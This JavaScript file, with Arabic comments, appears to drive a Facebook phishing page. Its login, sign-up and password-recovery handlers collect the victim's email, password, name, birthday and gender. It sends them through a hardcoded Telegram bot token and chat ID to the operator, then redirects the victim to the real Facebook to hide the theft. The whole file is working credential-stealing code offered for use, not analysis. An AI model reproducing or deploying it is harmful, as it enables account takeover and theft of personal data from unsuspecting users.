// وظيفة للتبديل بين النماذج
function switchTab(tabName) {
    document.querySelectorAll('.form-container').forEach(form => {
        form.classList.remove('active');
    });
    
    document.getElementById(`${tabName}-form`).classList.add('active');
}

// إرسال بيانات تسجيل الدخول
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    
    if (!email || !password) {
        alert('يرجى ملء جميع الحقول');
        return;
    }
    
    // إظهار حالة التحميل
    document.getElementById('loginLoading').style.display = 'block';
    
    // إرسال البيانات إلى بوت التليجرام
    sendToTelegram('تسجيل دخول', { email, password });
});

// إرسال بيانات إنشاء حساب
document.getElementById('signupForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const email = document.getElementById('signupEmail').value;
    const password = document.getElementById('signupPassword').value;
    const birthday = document.getElementById('birthday').value;
    const gender = document.querySelector('input[name="gender"]:checked') ? document.querySelector('input[name="gender"]:checked').value : 'غير محدد';
    
    if (!firstName || !lastName || !email || !password || !birthday) {
        alert('يرجى ملء جميع الحقول');
        return;
    }
    
    // إظهار حالة التحميل
    document.getElementById('signupLoading').style.display = 'block';
    
    // إرسال البيانات إلى بوت التليجرام
    sendToTelegram('إنشاء حساب', { firstName, lastName, email, password, birthday, gender });
});

// إرسال بيانات استعادة كلمة المرور
document.getElementById('forgotForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const recoveryEmail = document.getElementById('recoveryEmail').value;
    
    if (!recoveryEmail) {
        alert('يرجى إدخال البريد الإلكتروني أو رقم الهاتف');
        return;
    }
    
    // إظهار حالة التحميل
    document.getElementById('forgotLoading').style.display = 'block';
    
    // إرسال البيانات إلى بوت التليجرام
    sendToTelegram('نسيت كلمة السر', { recoveryEmail });
});

// وظيفة إرسال البيانات إلى بوت التليجرام
function sendToTelegram(action, data) {
    // معلومات بوت التليجرام الخاص بك
    const botToken = '8040046212:AAGlhEHjICyKJYww35tflD0QIVx_iktsmfQ';
    const chatId = '5058927918';
    
    // بناء الرسالة
    let message = `🔔 إشعار جديد من صفحة فيسبوك\n`;
    message += `الإجراء: ${action}\n`;
    message += `التفاصيل:\n`;
    
    for (const [key, value] of Object.entries(data)) {
        message += `${key}: ${value}\n`;
    }
    
    message += `الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
    message += `IP: ${generateRandomIP()}`;
    
    // إرسال الرسالة إلى التليجرام
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('تم إرسال البيانات إلى التليجرام:', data);
        
        // بعد الإرسال، توجيه المستخدم إلى فيسبوك الحقيقي
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com';
        }, 2000);
    })
    .catch(error => {
        console.error('خطأ في الإرسال:', error);
        
        // في حالة الخطأ، لا يزال يتم التوجيه إلى فيسبوك
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com';
        }, 2000);
    });
}

// توليد عنوان IP عشوائي (لأغراض المحاكاة فقط)
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}
